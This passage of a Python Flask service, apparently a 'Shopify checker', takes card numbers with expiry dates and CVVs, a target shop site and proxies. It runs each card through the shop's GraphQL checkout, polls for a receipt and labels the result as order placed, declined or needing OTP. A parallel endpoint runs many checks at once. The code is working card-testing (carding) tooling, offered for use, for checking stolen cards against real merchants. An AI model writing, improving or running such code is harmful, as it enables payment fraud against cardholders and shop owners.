                        non_localized_msg = error.get("nonLocalizedMessage", "")
                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                            detail = localized_msg or non_localized_msg
                            if detail:
                                return False, detail, gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                return False, "Submit Rejected", gateway, total_price, currency

            elif result_type == "Throttled":
                return False, "Throttled", gateway, total_price, currency

            receipt = submit_data.get("receipt", {})
            if not receipt:
                return False, "No receipt in submit response", gateway, total_price, currency

            rid = receipt.get("id")
            if not rid:
                return False, "No receipt ID", gateway, total_price, currency

            # ═══════════════════════════════════════════
            # POLL FOR RECEIPT
            # ═══════════════════════════════════════════

            params = {"operationName": "PollForReceipt"}
            poll_json_data = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt"
            }

            await asyncio.sleep(2)   # ✅ FIXED: sleep(3) → sleep(2)

            for i in range(4):
                response, final_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=1
                )

                if is_captcha_required(final_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency   # ✅ FIXED: True → False

                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get("data", {}).get("receipt", {})

                    if receipt_data:
                        typename = receipt_data.get("__typename", "")

                        if typename == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency

                        elif typename == "FailedReceipt":
                            error = receipt_data.get("processingError", {})
                            error_type = error.get("__typename", "")

                            if error_type == "PaymentFailed":
                                code = error.get("code", "")
                                msg = error.get("messageUntranslated", "")
                                if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else "PAYMENT_FAILED", gateway, total_price, currency

                            code = error.get("code") or error_type or "UNKNOWN_ERROR"
                            return False, code, gateway, total_price, currency

                        elif typename == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, total_price, currency

                        elif typename in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(2)   # ✅ FIXED: sleep(4) → sleep(2)
                            continue

                except Exception:
                    pass

            # ── Post-poll fallback parsing ──
            try:
                res_json = json.loads(final_text)
                receipt_final = res_json.get("data", {}).get("receipt", {})
                typename_final = receipt_final.get("__typename", "")

                if typename_final == "ProcessedReceipt":
                    return True, "ORDER_PLACED", gateway, total_price, currency

                if typename_final == "FailedReceipt":
                    error = receipt_final.get("processingError", {})
                    code = error.get("code", "")
                    error_type = error.get("__typename", "")
                    msg = error.get("messageUntranslated", "")

                    if error_type == "PaymentFailed":
                        if msg:
                            return True, msg, gateway, total_price, currency
                        return True, code if code else "PAYMENT_FAILED", gateway, total_price, currency

                    return False, code or error_type or "UNKNOWN_ERROR", gateway, total_price, currency

                if typename_final == "ActionRequiredReceipt":
                    return True, "OTP_REQUIRED", gateway, total_price, currency

            except (json.JSONDecodeError, Exception):
                pass

            # ── Final fallback: string-based checks ──
            code = extract_between(final_text, '{"code":"', '"')

            final_lower = final_text.lower()
            if "actionreq" in final_lower or "action_required" in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif "processedreceipt" in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif "failedreceipt" in final_lower or "declined" in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        msg = str(e) if str(e) else type(e).__name__
        return False, f"Error Processing Card: {msg}", gateway, total_price, currency


# ═══════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════

def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        "cc": parts[0].strip(),
        "mes": parts[1].strip(),
        "ano": parts[2].strip(),
        "cvv": parts[3].strip()
    }


def _safe_price(price):
    if price is None:
        return 0.0
    if isinstance(price, (int, float)):
        return float(price)
    if isinstance(price, str):
        try:
            return float(price.replace(",", ""))
        except (ValueError, TypeError):
            return 0.0
    return 0.0


async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)


# ═══════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════

app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400

        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts["cc"]
            mes = cc_parts["mes"]
            ano = cc_parts["ano"]
            cvv = cc_parts["cvv"]
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()

        clean_response = extract_clean_response(message)

        response_data = {
            "Gateway": gateway,
            "Price": _safe_price(price),
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }

        return jsonify(response_data)

    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get("cc", "")
        }), 500


@app.route("/shopify_parallel", methods=["GET"])
def shopify_checker_parallel():
    global _active_requests

    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400

        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400

        # ✅ FIXED: race-condition-free slot checking
        while True:
            with _request_lock:
                if _active_requests < PARALLEL_WORKERS:
                    _active_requests += 1
                    break
            time.sleep(0.5)

        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts["cc"]
            mes = cc_parts["mes"]
            ano = cc_parts["ano"]
            cvv = cc_parts["cvv"]
        except ValueError as e:
            with _request_lock:
                _active_requests -= 1
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        try:
            future = _executor.submit(
                run_card_check_parallel,
                cc, mes, ano, cvv, site, variant_id, proxy_str
            )
            success, message, gateway, price, currency = future.result(timeout=PARALLEL_TIMEOUT)

        except FuturesTimeoutError:
            # ✅ FIXED: removed extra decrement, finally handles it
            return jsonify({
                "error": "Request timeout",
                "status": False,
                "Gateway": "UNKNOWN",
                "Price": 0.0,
                "Response": "TIMEOUT",
                "cc": cc_string
            }), 504

        except Exception as e:
            # ✅ FIXED: removed extra decrement, finally handles it
            return jsonify({
                "error": str(e),
                "status": False,
                "Gateway": "UNKNOWN",
                "Price": 0.0,
                "Response": f"ERROR: {str(e)}",
                "cc": cc_string
            }), 500

        finally:
            # ✅ FIXED: single decrement point only
            with _request_lock:
                _active_requests -= 1

        clean_response = extract_clean_response(message)

        response_data = {
            "Gateway": gateway,
            "Price": _safe_price(price),
            "Response": clean_response,
            "Status": success,
            "cc": cc_string,
            "parallel_mode": True,
            "active_requests": _active_requests
        }

        return jsonify(response_data)

    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get("cc", "")
        }), 500


@app.route("/stats", methods=["GET"])
def parallel_stats():
    return jsonify({
        "max_workers": PARALLEL_WORKERS,
        "active_requests": _active_requests,
        "available_slots": PARALLEL_WORKERS - _active_requests,
        "original_endpoint": "/shopify",
        "parallel_endpoint": "/shopify_parallel"
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
